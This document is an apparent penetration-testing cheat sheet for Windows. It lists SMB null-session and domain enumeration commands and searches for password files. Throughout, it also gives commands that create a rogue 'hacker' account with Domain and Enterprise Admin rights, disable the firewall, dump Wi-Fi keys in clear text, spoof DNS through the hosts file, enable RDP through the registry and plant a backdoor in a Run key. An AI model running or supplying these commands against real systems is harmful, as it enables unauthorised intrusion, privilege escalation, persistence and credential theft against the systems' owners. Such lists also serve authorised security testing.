# Windows


### Anonymous users can obtain the Windows password policy
```
msfconsole
use auxiliary/scanner/smb/smb_enumusers
```

### CIFS NULL Session Permitted
```
enum4linux -a <target IP>
```
```
rpcclient -U "" <target IP>

Enter  's password: <return>
```
```
rpcclient $>
  enumdomusers
  enumdomusers
  netshareenum
  netshareenumall
  querydominfo
  getdompwinfo
  srvinfo
  ```
  ```
net use \\target IP\ipc$ "" /u:""            * Windows
```


### CIFS Share Writeable By Everyone
```

Places > Network > Browse Network
```


### Connect anonymously
```
smbclient -N -L <target IP>
```

### Connect with credentials
```
smbclient -W domain -U user -L <target IP>
```


### NetBIOS and SMB
```
nmap -Pn -n -T4 -p139,445 --script=smb-check-vulns --script-args=unsafe=1 <range>
```
```
enum -G <target IP>                         * Windows
enum -P <target IP>

nbtenum -r <target IP>                      * Windows
nbtenum -q <target IP>

nbtscan -r <target range>
nbtscan -f hosts.txt
```

### Show domain users and group information
```

DumpSec
```

### Show members of domain groups
```
global.exe "domain admins" \\dc-controller
```

### Search all folders for filenames that include 'password'.
```
dir /s /p *password*.*                      * Windows
```

### net commands
```
net accounts                                * Local password policies.
net accounts /domain
net config workstation
net localgroup                              * Local Security Groups.
net localgroup /domain                      * Domain Security Groups.
net localgroup Administrators               * Users in the local Administrators Security Group.
net localgroup Administrators /domain       * Users in the domain Administrators Security Group.
net share
net user                                    * Local users.
net user /domain > users.txt                * All users in the current user's domain (take a few to run).
net user hacker /domain                     * Info on domain user.
net view                                    * Computers in the users domain and other domains.
net view /domain                            * Computers in other domain.

net user hacker password /add
net localgroup administrators /add hacker
```

### Domain accounts
```
net group “Domain Admins" /domain > domain-admin.txt
net group “Domain Users" /domain > domain-users.txt

net user hacker password /add /domain
net group "Enterprise Admins" hacker /add /domain
net groups "Enterprise Admins" /domain
```

### Enumeration
```
arp -a
ipconfig /all
ipconfig /displaydns
netstat -ano
netstat -ano | findstr LISTENING
netstat -c
netstat -ns
netstat -vb
route print

date /t & time /t
doskey /history
gpresult /COMPUTERNAME
gpresult /%username%
gpresult /z
nbtstat -A <target IP>
nbtstat -a <name of target>
net group
net group administrators
net session
net start
set
tasklist /m
tasklist /svc
tasklist /v

dir c:\*.xls /s				         * Show all Excel docs.
dir c:\*.xlsx /s			              * Show all Excel docs.
dir c:\*.ppt /s				         * Show all PowerPoint docs.
dir c:\*.pptx /s			              * Show all PowerPoint docs.
dir c:\*.doc /s				         * Show all Word docs.
dir c:\*.docx /s			              * Show all Word docs.
dir c:\*.pdf /s				         * Show all PDFs.
```

### Firewall
```
netsh firewall show config
netsh firewall add portopening TCP 8081 ePO
netsh firewall set opmode disable           * Disable firewall.

firewall show state
netsh firewall set opmode disable

netsh wlan show interfaces
netsh wlan show drivers
netsh wlan show networks
netsh wlan show profiles
netsh wlan show profiles name="name"
show profiles name="name" key=clear
```


### Local DNS spoofing
```
echo <attacker IP> facebook >> %WINDIR%\System32\drivers\etc\hosts
type %WINDIR%\System32\drivers\etc\hosts
```


### Misc
```
cd \WINDOWS\system32\
type %SYSTEMDRIVE%\boot.ini
type %WINDIR%\win.ini
fsutil fsinfo drives

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

netsh rdesktop <target-IP>
```


HKLM
```
File > Load Hive
Just give it a name.
/Microsoft Windows/Current Version/Run
Add your back doored file.
```
